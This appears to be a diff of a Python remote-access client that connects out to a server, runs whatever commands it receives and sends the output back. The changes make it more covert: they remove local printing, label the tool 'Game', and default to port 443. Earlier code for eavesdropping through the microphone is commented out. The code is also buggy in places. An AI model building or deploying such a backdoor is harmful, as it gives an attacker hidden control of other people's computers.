@@ -15,14 +15,16 @@ machine's microphone.
 
 import signal
 import subprocess
-from time import localtime as time
 from socket import *
+import sys
+import os
+import subprocess
+import argparse 
 
-from escuta import escuta
+#from escuta import escuta
 
 s = None
 connected = False
-
 
 class Alarm(Exception):
     """Used to make sure a subprocess lasts 30 seconds max"""
@@ -57,16 +59,8 @@ def main(host, port):
                         if len(commands) > 1:
                             os.chdir(commands[1])
                         s.send(os.getcwd())
-                        print "\n" % os.getcwd()
                     elif commands[0] == "pwd":
-                        s.send(os.getcwd())
-                    elif commands[0] == "escuta":
-                        escuta()
-                    # elif (commands[0] == "grampo"):
-                    #       grampo = []
-                    #      grampo = os.system("python som.py")
-                    elif commands[0] == "pararescuta":
-                        os.system("clear")
+                        s.send(os.getcwd())             
                     elif commands[0] == "opencd":
                         os.system("eject")
                     elif commands[0] == "quit":
@@ -86,37 +80,43 @@ def main(host, port):
                             en_STDOUT = bytearray(STDOUT)
                             if en_STDERR == "":
                                 if en_STDOUT != "":
-                                    print (en_STDOUT)
+                                 
                                     s.send(en_STDOUT)
                                 else:
                                     s.send(en_STDOUT)
                                     pass
                             else:
-                                print en_STDERR
+                                
                                 s.send(en_STDERR)
                         except Alarm:
                             comm.terminate()
                             comm.kill()
                             s.send("\n")
-                        signal.alarm(5)
+                        signal.alarm(100)
             except:
                 s.close()
                 break
 
-
 if __name__ == "__main__":
-    if len(sys.argv) == 3:
-        host = sys.argv[1]
-        port = int(sys.argv[2])
-    else:
-        sys.exit("Example: python client.py <server ip> <server port>")
+    carg = argparse.ArgumentParser(description='Game',
+                                   epilog='Use me')
 
+    carg.add_argument('-d', '--host', type=str, help='Host to made connection', required=True, default='127.0.0.0.1')
+    carg.add_argument('-p', '--port', type=int, help='Port to connect',default=443)
+    args = carg.parse_args()
+
+    host = args.host
+    port = args.port
+
+    if len(sys.argv) == True:
+        host_server = host
+        port_server = port
     while True:
         try:
             main(host, port)
-            escuta()
-            time()
+   #        escuta()
+    #        time()
         except KeyboardInterrupt:
             # Close connection, if exists
             if connected:
-                s.close()
+                s.close
